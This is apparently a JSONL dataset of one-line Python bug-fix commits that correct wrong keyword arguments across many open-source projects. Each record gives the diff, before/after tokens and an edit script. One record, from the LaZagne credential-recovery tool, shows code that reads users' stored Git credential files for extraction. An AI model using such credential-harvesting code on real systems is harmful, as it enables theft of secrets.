{"project": "iterative-Random-Forest", "commit_sha": "dc28e23e4bfbd23b64956fc0c832a1240fbd3c76", "parent_sha": "9c162a86d2526109508242ca74b01c7d9c2f7a99", "file_path": "benchmarks/bench_plot_fastkmeans.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,8 +40,8 @@ def compute_bench(samples_range, features_range):\n             print('Fast K-Means')\n             # let's prepare the data in small chunks\n             mbkmeans = MiniBatchKMeans(init='k-means++',\n-                                      k=10,\n-                                      batch_size=chunk)\n+                                       n_clusters=10,\n+                                       batch_size=chunk)\n             tstart = time()\n             mbkmeans.fit(data)\n             delta = time() - tstart\n", "before": "mbkmeans = MiniBatchKMeans ( init = 'k-means++' , k = 10 , batch_size = chunk )", "after": "mbkmeans = MiniBatchKMeans ( init = 'k-means++' , n_clusters = 10 , batch_size = chunk )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:k\", 3, 39, 3, 40], \"n_clusters\"]]"}
{"project": "tensorflow-sample-code", "commit_sha": "5f3f752a92b8a5b35f0b5cf00a37b8d40c30ac45", "parent_sha": "5f69d9bbf0fcf941d013bdee50b77c3fcab3b946", "file_path": "tfjob/docker/distributed-mnist/main.py", "project_url": "https://github.com/cheyang/tensorflow-sample-code", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ def train():\n   sv = tf.train.Supervisor(is_chief=is_chief,\n \t\t\t\t\t\tglobal_step=global_step,\n \t\t\t\t\t\tinit_op=init_op,\n-\t\t\t\t\t\tlog_dir=FLAGS.log_dir)\n+\t\t\t\t\t\tlogdir=FLAGS.log_dir)\n   # sess_config = tf.ConfigProto(allow_soft_placement=True, log_device_placement=True,\n   #                               device_filters=[\"/job:ps\", \"/job:worker/task:%d\" % FLAGS.worker_index])\n \n", "before": "sv = tf . train . Supervisor ( is_chief = is_chief , global_step = global_step , init_op = init_op , log_dir = FLAGS . log_dir )", "after": "sv = tf . train . Supervisor ( is_chief = is_chief , global_step = global_step , init_op = init_op , logdir = FLAGS . log_dir )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:log_dir\", 3, 7, 3, 14], \"logdir\"]]"}
{"project": "cpymad", "commit_sha": "8c50d7fe11fc34143e11968855381be8e983e43a", "parent_sha": "6401dceb6f23088439877cd26668ac8caafc344b", "file_path": "cpymad/rpc_util/service.py", "project_url": "https://github.com/hibtc/cpymad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class Service(object):\n \n     def configure_logging(self):\n         \"\"\"Configure logging module.\"\"\"\n-        logging.basicConfig(logLevel=logging.INFO)\n+        logging.basicConfig(level=logging.INFO)\n \n     def run(self):\n", "before": "logging . basicConfig ( logLevel = logging . INFO )", "after": "logging . basicConfig ( level = logging . INFO )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:logLevel\", 3, 29, 3, 37], \"level\"]]"}
{"project": "feat", "commit_sha": "7990483a6e562b144fe67baa3b181f55ea421da7", "parent_sha": "a8f86d4321154cc86d5c78ffd942a13a0aacb756", "file_path": "src/feat/gateway/gateway.py", "project_url": "https://github.com/f3at/feat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ class Gateway(log.LogProxy, log.Logger):\n                 server = webserver.Server(port, self._build_resource(port),\n                                           security_policy=self._security,\n                                           log_keeper=self,\n-                                          statistics=self._statistics)\n+                                          web_statistics=self._statistics)\n                 self._initiate_server(server)\n                 self._server = server\n                 self.info(\"%sgateway started on %s:%d\".capitalize(),\n", "before": "server = webserver . Server ( port , self . _build_resource ( port ) , security_policy = self . _security , log_keeper = self , statistics = self . _statistics )", "after": "server = webserver . Server ( port , self . _build_resource ( port ) , security_policy = self . _security , log_keeper = self , web_statistics = self . _statistics )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:statistics\", 3, 43, 3, 53], \"web_statistics\"]]"}
{"project": "vsc-base", "commit_sha": "c21a685c4938b4022e109d39dcc2a827404d77f2", "parent_sha": "4dd77244d7816e68e0cca05c959a929727c750ad", "file_path": "lib/vsc/utils/fancylogger.py", "project_url": "https://github.com/hpcugent/vsc-base", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -472,7 +472,7 @@ def getAllExistingLoggers():\n     \"\"\"\n     @return: the existing loggers, in a list of C{(name, logger)} tuples\n     \"\"\"\n-    rootlogger = logging.getLogger(fname=False)\n+    rootlogger = logging.getLogger(name=False)\n     # undocumented manager (in 2.4 and later)\n     manager = rootlogger.manager\n \n", "before": "rootlogger = logging . getLogger ( fname = False )", "after": "rootlogger = logging . getLogger ( name = False )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:fname\", 3, 36, 3, 41], \"name\"]]"}
{"project": "solution", "commit_sha": "755ecd4867ea5dfd7360017b28d1ab3f969ae4c3", "parent_sha": "be971aa3a0e92f39ab874b3b45e8fdbae3de947e", "file_path": "solution/formset.py", "project_url": "https://github.com/jpscaletti/solution", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class FormSet(object):\n \n     @property\n     def form(self):\n-        return self._form_class(name=self._get_fullname(1))\n+        return self._form_class(prefix=self._get_fullname(1))\n \n     def _init(self, data=None, objs=None, files=None):\n         self._errors = {}\n", "before": "return self . _form_class ( name = self . _get_fullname ( 1 ) )", "after": "return self . _form_class ( prefix = self . _get_fullname ( 1 ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 33, 3, 37], \"prefix\"]]"}
{"project": "py-data-api", "commit_sha": "f966eb203f24a27f7637498126f00a50a59684bc", "parent_sha": "c9d81d192bfb64fd7406e04126e9da4317937072", "file_path": "pydataapi/pydataapi.py", "project_url": "https://github.com/koxudaxi/py-data-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -398,7 +398,7 @@ class Options(BaseModel):\n         return generate_sql(v)\n \n     def build(self) -> Dict[str, Any]:\n-        return self.dict(skip_defaults=True, by_alias=True)\n+        return self.dict(exclude_unset=True, by_alias=True)\n \n \n def find_arn_by_resource_name(\n", "before": "return self . dict ( skip_defaults = True , by_alias = True )", "after": "return self . dict ( exclude_unset = True , by_alias = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:skip_defaults\", 3, 26, 3, 39], \"exclude_unset\"]]"}
{"project": "Pointnet2.ScanNet", "commit_sha": "d9360957077116266eeef8ca7b092d1bdc540833", "parent_sha": "b147473208997c0fe403c8d8e04010ae3d98f2e0", "file_path": "train.py", "project_url": "https://github.com/daveredrum/Pointnet2.ScanNet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def get_solver(args, dataloader, stamp, weight):\n     sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pointnet2/'))\n     Pointnet = importlib.import_module(\"pointnet2_semseg\")\n     input_channels = int(args.use_color) * 3 + int(args.use_normal) * 3 + int(args.use_multiview) * 128\n-    model = Pointnet.get_model(num_classes=CONF.NUM_CLASSES, is_msg=args.use_msg, input_channels=input_channels, use_xyz=not args.no_xyz, use_bn=not args.no_bn).cuda()\n+    model = Pointnet.get_model(num_classes=CONF.NUM_CLASSES, is_msg=args.use_msg, input_channels=input_channels, use_xyz=not args.no_xyz, bn=not args.no_bn).cuda()\n \n     num_params = get_num_params(model)\n     criterion = WeightedCrossEntropyLoss()\n", "before": "model = Pointnet . get_model ( num_classes = CONF . NUM_CLASSES , is_msg = args . use_msg , input_channels = input_channels , use_xyz = not args . no_xyz , use_bn = not args . no_bn ) . cuda ( )", "after": "model = Pointnet . get_model ( num_classes = CONF . NUM_CLASSES , is_msg = args . use_msg , input_channels = input_channels , use_xyz = not args . no_xyz , bn = not args . no_bn ) . cuda ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:use_bn\", 3, 139, 3, 145], \"bn\"]]"}
{"project": "biostar-central", "commit_sha": "8c708cb230523517b94aeefc4d5e1d6c0d73a994", "parent_sha": "b4628e9b0838f4d0894f4d3b53210755cc87dd3a", "file_path": "main/server/awards.py", "project_url": "https://github.com/meraki/biostar-central", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,10 +99,10 @@ def instant(request):\n         if badge:\n             badge_count = models.Award.objects.filter(user=user, badge=badge).count()\n             if mode == 'vote':\n-                post_count  = models.Post.objects.filter(author=user, type=POST_QUESTION, votes__gt=value).count()\n+                post_count  = models.Post.objects.filter(author=user, type=POST_QUESTION, score__gt=value).count()                \n             else:    \n                 post_count  = models.Post.objects.filter(author=user, type=POST_QUESTION, views__gt=value).count()\n-                \n+      \n             if badge_count < post_count:\n                 create(request, user=user, badge=badge)\n                 return\n", "before": "post_count = models . Post . objects . filter ( author = user , type = POST_QUESTION , votes__gt = value ) . count ( )", "after": "post_count = models . Post . objects . filter ( author = user , type = POST_QUESTION , score__gt = value ) . count ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:votes__gt\", 3, 91, 3, 100], \"score__gt\"]]"}
{"project": "nilearn", "commit_sha": "0948d6b1441c8712e60ee5275396cfed80342e1e", "parent_sha": "98f413ace5ca51d25295b803c17f19c34a1e8127", "file_path": "nilearn/tests/test_datasets.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ def test_get_dataset_dir():\n \n     expected_base_dir = os.path.join(tmpdir, 'nilearn_shared_data')\n     os.environ['NILEARN_SHARED_DATA'] = expected_base_dir\n-    data_dir = datasets._get_dataset_dir('test', pre_dirs=[no_write],\n+    data_dir = datasets._get_dataset_dir('test', default_paths=[no_write],\n                                          verbose=0)\n     # Non writeable dir is returned because dataset may be in there.\n     assert_equal(data_dir, no_write)\n", "before": "data_dir = datasets . _get_dataset_dir ( 'test' , pre_dirs = [ no_write ] , verbose = 0 )", "after": "data_dir = datasets . _get_dataset_dir ( 'test' , default_paths = [ no_write ] , verbose = 0 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:pre_dirs\", 3, 50, 3, 58], \"default_paths\"]]"}
{"project": "erpnext", "commit_sha": "b7f0cbf91491deea57952d597e657d91b44f48cf", "parent_sha": "6ff2f6690fb5a531f1fe4498791f7c072ecf814a", "file_path": "patches/november_2012/production_order_patch.py", "project_url": "https://github.com/Systematrix/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,5 +8,5 @@ def execute():\n \t\tset use_multi_level_bom = if(consider_sa_items_as_raw_materials='Yes', 0, 1)\"\"\")\n \t\n \twebnotes.conn.sql(\"\"\"update `tabProduction Order` \n-\t\tset use_multi_level_bom = if(consider_sa_items_as_raw_materials='Yes', 0, 1)\n+\t\tset use_multi_level_bom = if(consider_sa_items='Yes', 0, 1)\n", "before": "use_multi_level_bom = if ( consider_sa_items_as_raw_materials = 'Yes' , 0 , 1 )", "after": "use_multi_level_bom = if ( consider_sa_items = 'Yes' , 0 , 1 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:consider_sa_items_as_raw_materials\", 3, 32, 3, 66], \"consider_sa_items\"]]"}
{"project": "backend", "commit_sha": "9693c406448ed8ae1707595cd097d1807f2c2280", "parent_sha": "afb519fa764d7f4fc1238cd5d92d36911277ad94", "file_path": "pytest/test_api.py", "project_url": "https://github.com/Sakuten/backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ def test_status(client):\n     assert 'id' in resp.get_json()['status']\n \n     with client.application.app_context():\n-        db_status = User.query.filter_by(id=user['username']).first()\n+        db_status = User.query.filter_by(username=user['username']).first()\n \n         assert resp.get_json()['status'] == user_schema.dump(db_status)[0].dump()\n \n", "before": "db_status = User . query . filter_by ( id = user [ 'username' ] ) . first ( )", "after": "db_status = User . query . filter_by ( username = user [ 'username' ] ) . first ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:id\", 3, 42, 3, 44], \"username\"]]"}
{"project": "weaver", "commit_sha": "b2b2402327b4627b369d36bdf36905300efa0633", "parent_sha": "83062e4d5538256dcacb88ce2792e95d508d05cf", "file_path": "twitcher/rpcinterface.py", "project_url": "https://github.com/crim-ca/weaver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def addService(request, url):\n @xmlrpc_method(endpoint='api')\n def removeService(request, name):\n     try:\n-        registry.remove_service(request, name=name)\n+        registry.remove_service(request, service_name=name)\n     except:\n         logger.exception('unregister failed')\n         return False\n", "before": "registry . remove_service ( request , name = name )", "after": "registry . remove_service ( request , service_name = name )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 42, 3, 46], \"service_name\"]]"}
{"project": "weaver", "commit_sha": "22c952b4d5ebd1c8a2193ca82d92b1a392b8ff87", "parent_sha": "1802e3cf1c864fd16f67b9599e35bc402657d3aa", "file_path": "twitcher/tests/functional/test_ems_end2end.py", "project_url": "https://github.com/crim-ca/weaver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ class End2EndEMSTestCase(TestCase):\n     def get_process_package_mock():\n         return (\n             mock.patch('twitcher.processes.sources.get_data_source_from_url',\n-                       new_callable=End2EndEMSTestCase.mock_get_data_source_from_url),\n+                       side_effect=End2EndEMSTestCase.mock_get_data_source_from_url),\n         )\n \n     @staticmethod\n", "before": "return ( mock . patch ( 'twitcher.processes.sources.get_data_source_from_url' , new_callable = End2EndEMSTestCase . mock_get_data_source_from_url ) , )", "after": "return ( mock . patch ( 'twitcher.processes.sources.get_data_source_from_url' , side_effect = End2EndEMSTestCase . mock_get_data_source_from_url ) , )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:new_callable\", 3, 24, 3, 36], \"side_effect\"]]"}
{"project": "hdtools", "commit_sha": "1ec19a8b05cf0d9fe7d20af1f1c999248d2f87b6", "parent_sha": "732eeb02b92c944b89603c47ec1f74bdd0d3103b", "file_path": "hdtools/extended_keys.py", "project_url": "https://github.com/morvaridio/hdtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ class ExtendedKey:\n         key = read(33)\n         key = PrivateKey(key, network=network) if is_private else PublicKey.decode(key, network=network)\n         assert not bts, 'Leftover bytes'\n-        return constructor(key, code, depth=depth, i=i, parent=fingerprint, path=path, addresstype=address_lookup[net])\n+        return constructor(key, code, depth=depth, i=i, parent=fingerprint, path=path, address_type=address_lookup[net])\n \n     @classmethod\n     def decode(cls, string: str, network='btc'):\n", "before": "return constructor ( key , code , depth = depth , i = i , parent = fingerprint , path = path , addresstype = address_lookup [ net ] )", "after": "return constructor ( key , code , depth = depth , i = i , parent = fingerprint , path = path , address_type = address_lookup [ net ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:addresstype\", 3, 88, 3, 99], \"address_type\"]]"}
{"project": "drink-stash", "commit_sha": "13c80a3e7728e513e54183cd581b8b90c03c20eb", "parent_sha": "d6909414ed820f1f58a24f58a8d00281e3d39492", "file_path": "api/drinks/views.py", "project_url": "https://github.com/gthole/drink-stash", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ class RecipeViewSet(LazyViewSet):\n     def filter_queryset(self, *args, **kwargs):\n         qs = super().filter_queryset(*args, **kwargs)\n         qs = qs.annotate(comment_count=Count('comments', distinct=True))\n-        qs = qs.annotate(favorite_count=Count('favorites', distince=True))\n+        qs = qs.annotate(favorite_count=Count('favorites', distinct=True))\n         has_favorite = UserFavorite.objects.filter(\n             recipe=OuterRef('pk'),\n             user=self.request.user\n", "before": "qs = qs . annotate ( favorite_count = Count ( 'favorites' , distince = True ) )", "after": "qs = qs . annotate ( favorite_count = Count ( 'favorites' , distinct = True ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:distince\", 3, 60, 3, 68], \"distinct\"]]"}
{"project": "neutron", "commit_sha": "5dea9b2f49d97a26952d58fba95cfbd734729615", "parent_sha": "368b7f858e0f7e713911411ecf6d605f24c525b1", "file_path": "neutron/wsgi.py", "project_url": "https://github.com/promptworks/neutron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -907,7 +907,7 @@ class Application(object):\n           res = 'message\\n'\n \n           # Option 2: a nicely formatted HTTP exception page\n-          res = exc.HTTPForbidden(detail='Nice try')\n+          res = exc.HTTPForbidden(explanation='Nice try')\n \n           # Option 3: a webob Response object (in case you need to play with\n           # headers, or you want to be treated like an iterable, or or or)\n", "before": "res = exc . HTTPForbidden ( detail = 'Nice try' )", "after": "res = exc . HTTPForbidden ( explanation = 'Nice try' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:detail\", 3, 35, 3, 41], \"explanation\"]]"}
{"project": "LaZagne", "commit_sha": "f8ffaaac0da6106ffd5abfd4dd67a0a82d9ce0ca", "parent_sha": "516933be3c75164f949063c8179597da6844fc76", "file_path": "Linux/lazagne/softwares/git/gitforlinux.py", "project_url": "https://github.com/rvrsh3ll/LaZagne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ class GitForLinux(ModuleInfo):\n \n         # Apply the password extraction on the defined locations\n         pwd_found = []\n-        for location in homes.get(directory=[u'.git-credentials', u'.config/git/credentials']):\n+        for location in homes.get(file=[u'.git-credentials', u'.config/git/credentials']):\n             pwd_found += self.extract_credentials(location)\n             known_locations.add(location)\n \n", "before": "for location in homes . get ( directory = [ u'.git-credentials' , u'.config/git/credentials' ] ) : pwd_found += self . extract_credentials ( location ) known_locations . add ( location )", "after": "for location in homes . get ( file = [ u'.git-credentials' , u'.config/git/credentials' ] ) : pwd_found += self . extract_credentials ( location ) known_locations . add ( location )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:directory\", 3, 35, 3, 44], \"file\"]]"}
{"project": "breadability", "commit_sha": "bd084a8e285bb423b5cf6e04761f8f9233890783", "parent_sha": "8f3ebf09504288fbc46e491937a61cd29fad4f3b", "file_path": "readability/scripts/client.py", "project_url": "https://github.com/iAcquire/breadability", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ def main():\n         with open(resource, \"r\") as file:\n             content = file.read()\n \n-    document = Article(content, url=url, fragment=args[\"--fragment\"])\n+    document = Article(content, url=url, return_fragment=args[\"--fragment\"])\n     if args[\"--browser\"]:\n         html_file = NamedTemporaryFile(mode=\"w\", suffix=\".html\", delete=False)\n \n", "before": "document = Article ( content , url = url , fragment = args [ \"--fragment\" ] )", "after": "document = Article ( content , url = url , return_fragment = args [ \"--fragment\" ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:fragment\", 3, 42, 3, 50], \"return_fragment\"]]"}
{"project": "meetbot", "commit_sha": "0ce50b1b4ec1a921f9ab5f19bbf4cea9a7428caa", "parent_sha": "d2f7983766f292e00a20d3cd40158c197ee80727", "file_path": "writers.py", "project_url": "https://github.com/buildbot/meetbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ class HTMLlog(_BaseWriter):\n         # object.\n         formatter = HtmlFormatter(lineanchors='l',\n                                   full=True, style=M.config.pygmentizeStyle,\n-                                  output_encoding=self.M.config.output_codec)\n+                                  outencoding=self.M.config.output_codec)\n         Lexer = IrcLogsLexer\n         Lexer.tokens['msg'][1:1] = \\\n            [ # match:   #topic commands\n", "before": "formatter = HtmlFormatter ( lineanchors = 'l' , full = True , style = M . config . pygmentizeStyle , output_encoding = self . M . config . output_codec )", "after": "formatter = HtmlFormatter ( lineanchors = 'l' , full = True , style = M . config . pygmentizeStyle , outencoding = self . M . config . output_codec )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:output_encoding\", 3, 35, 3, 50], \"outencoding\"]]"}
{"project": "horizon", "commit_sha": "680c24c79ba79d671de1ac940ac10acae463ea51", "parent_sha": "737b1cd83336f4232522eee69de95a593495df44", "file_path": "horizon/workflows/views.py", "project_url": "https://github.com/promptworks/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ class WorkflowView(generic.TemplateView):\n                                        validate_step_start,\n                                        validate_step_end)\n             return http.HttpResponse(json.dumps(data),\n-                                     mimetype=\"application/json\")\n+                                     content_type=\"application/json\")\n         if workflow.is_valid():\n             try:\n                 success = workflow.finalize()\n", "before": "return http . HttpResponse ( json . dumps ( data ) , mimetype = \"application/json\" )", "after": "return http . HttpResponse ( json . dumps ( data ) , content_type = \"application/json\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mimetype\", 3, 38, 3, 46], \"content_type\"]]"}
{"project": "keystone", "commit_sha": "a68d530133b9687f85dad4edf74d4b69a71e4959", "parent_sha": "9bc14483a438926e2a60ceae9bbd29b061a31829", "file_path": "keystone/identity/core.py", "project_url": "https://github.com/promptworks/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ class PublicRouter(wsgi.ComposableRouter):\n         mapper.connect('/tenants',\n                        controller=tenant_controller,\n                        action='get_tenants_for_token',\n-                       conditions=dict(methods=['GET']))\n+                       conditions=dict(method=['GET']))\n \n \n class AdminRouter(wsgi.ComposableRouter):\n", "before": "mapper . connect ( '/tenants' , controller = tenant_controller , action = 'get_tenants_for_token' , conditions = dict ( methods = [ 'GET' ] ) )", "after": "mapper . connect ( '/tenants' , controller = tenant_controller , action = 'get_tenants_for_token' , conditions = dict ( method = [ 'GET' ] ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:methods\", 3, 40, 3, 47], \"method\"]]"}
{"project": "sympy", "commit_sha": "244317adcc3d5ccac3e23ea9989242673a02bfb1", "parent_sha": "d3559c7d7d6d54f2d1390fa7108cc8dfeff9c9d5", "file_path": "sympy/core/tests/test_assumptions.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1094,7 +1094,7 @@ def test_complex_reciprocal_imaginary():\n     assert (1 / (4 + 3*I)).is_imaginary is False\n \n def test_issue_16313():\n-    x = Symbol('x', real=False)\n+    x = Symbol('x', extended_real=False)\n     k = Symbol('k', real=True)\n     l = Symbol('l', real=True, zero=False)\n     assert (-x).is_real is False\n", "before": "x = Symbol ( 'x' , real = False )", "after": "x = Symbol ( 'x' , extended_real = False )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:real\", 3, 21, 3, 25], \"extended_real\"]]"}
{"project": "xmlsite", "commit_sha": "ba51308da24a7346c5f67cd88a115d6795bfcb8d", "parent_sha": "8438a28410921ab0d05fb333d562417516c2d14f", "file_path": "lib/xmlsite/state.py", "project_url": "https://github.com/brianvanderburg2/xmlsite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class StateParser(object):\n             state = _State()\n \n             if self.bookmark:\n-                bookmark = entry.xpath(self.bookmark, namepsaces=self.ns)\n+                bookmark = entry.xpath(self.bookmark, namespaces=self.ns)\n                 if bookmark:\n                     state.bookmark = '' + bookmark[0]\n \n", "before": "bookmark = entry . xpath ( self . bookmark , namepsaces = self . ns )", "after": "bookmark = entry . xpath ( self . bookmark , namespaces = self . ns )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:namepsaces\", 3, 55, 3, 65], \"namespaces\"]]"}
{"project": "mp3", "commit_sha": "2813475d17ac5c3dd0592247efe35a619af27b1e", "parent_sha": "ea05d6380be2283df75ca3a6abe057b294727f81", "file_path": "src/mp3/cordtransform.py", "project_url": "https://github.com/rkdarst/mp3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class CordTransform(mp3.cord.Cord):\n         #mp3.transform_frame_in_place(frame, self.move, self.rotate)\n         self._frame = mp3.cordtransform(frame,\n                                         move=self._move,\n-                                        move=self._rotate)\n+                                        rotate=self._rotate)\n         return self._frame\n \n     def zero_frame(self):\n", "before": "self . _frame = mp3 . cordtransform ( frame , move = self . _move , move = self . _rotate )", "after": "self . _frame = mp3 . cordtransform ( frame , move = self . _move , rotate = self . _rotate )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:move\", 3, 41, 3, 45], \"rotate\"]]"}
{"project": "django-oscar", "commit_sha": "b01e9f62dcc74b2ed1e83b81ee39c5e08f4bc90e", "parent_sha": "5f67e3834a63a5ead91c3d447c1300edd95670bd", "file_path": "oscar/apps/dashboard/pages/views.py", "project_url": "https://github.com/iamsk/django-oscar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class PageListView(ListView):\n         data = self.form.cleaned_data\n \n         if data['title']:\n-            queryset = queryset.filter(title__contains=data['title'])\n+            queryset = queryset.filter(title__icontains=data['title'])\n             self.description += \" with title containing '%s'\" % data['title']\n \n         return queryset\n", "before": "queryset = queryset . filter ( title__contains = data [ 'title' ] )", "after": "queryset = queryset . filter ( title__icontains = data [ 'title' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:title__contains\", 3, 40, 3, 55], \"title__icontains\"]]"}
{"project": "capirca", "commit_sha": "906f43e42e78cafdebdd7cbfe0395fbc52c7853a", "parent_sha": "c25c0b23808dfab3d1f6d214c1eac0f079a7bd0f", "file_path": "lib/nacaddr.py", "project_url": "https://github.com/rrbone/capirca", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ def CollapseAddrList(addresses):\n \n def SortAddrList(addresses):\n   \"\"\"Return a sorted list of nacaddr objects.\"\"\"\n-  return sorted(addresses, cmp=ipaddr._BaseNet._get_networks_key)\n+  return sorted(addresses, key=ipaddr._BaseNet._get_networks_key)\n \n \n def RemoveAddressFromList(superset, exclude):\n", "before": "return sorted ( addresses , cmp = ipaddr . _BaseNet . _get_networks_key )", "after": "return sorted ( addresses , key = ipaddr . _BaseNet . _get_networks_key )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:cmp\", 3, 28, 3, 31], \"key\"]]"}
{"project": "ckan", "commit_sha": "8e67312b9de7e0386707b9a503d350f2da244049", "parent_sha": "b84661735cbd19b0fd3c7701debed5275b70fab7", "file_path": "ckan/lib/i18n.py", "project_url": "https://github.com/servercode/ckan", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -225,7 +225,7 @@ def _set_lang(lang):\n     if config.get('ckan.i18n_directory'):\n         fake_config = {'pylons.paths': {'root': config['ckan.i18n_directory']},\n                        'pylons.package': config['pylons.package']}\n-        i18n.set_lang(lang, config=fake_config, class_=Translations)\n+        i18n.set_lang(lang, pylons_config=fake_config, class_=Translations)\n     else:\n         i18n.set_lang(lang, class_=Translations)\n \n", "before": "i18n . set_lang ( lang , config = fake_config , class_ = Translations )", "after": "i18n . set_lang ( lang , pylons_config = fake_config , class_ = Translations )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:config\", 3, 29, 3, 35], \"pylons_config\"]]"}
{"project": "st2", "commit_sha": "37b8cb29632e4d89a7cc5af869065368eb159511", "parent_sha": "83c7d953a0ecc801a962e259a88da4aeba4e27e1", "file_path": "st2exporter/st2exporter/exporter/dumper.py", "project_url": "https://github.com/ojosdegris/st2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -186,5 +186,5 @@ class Dumper(object):\n         else:\n             marker_id = None\n \n-        marker_db = DumperMarkerDB(marker_id=marker_id, marker=marker, updated_at=updated_at)\n+        marker_db = DumperMarkerDB(id=marker_id, marker=marker, updated_at=updated_at)\n         return DumperMarker.add_or_update(marker_db)\n", "before": "marker_db = DumperMarkerDB ( marker_id = marker_id , marker = marker , updated_at = updated_at )", "after": "marker_db = DumperMarkerDB ( id = marker_id , marker = marker , updated_at = updated_at )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:marker_id\", 3, 36, 3, 45], \"id\"]]"}
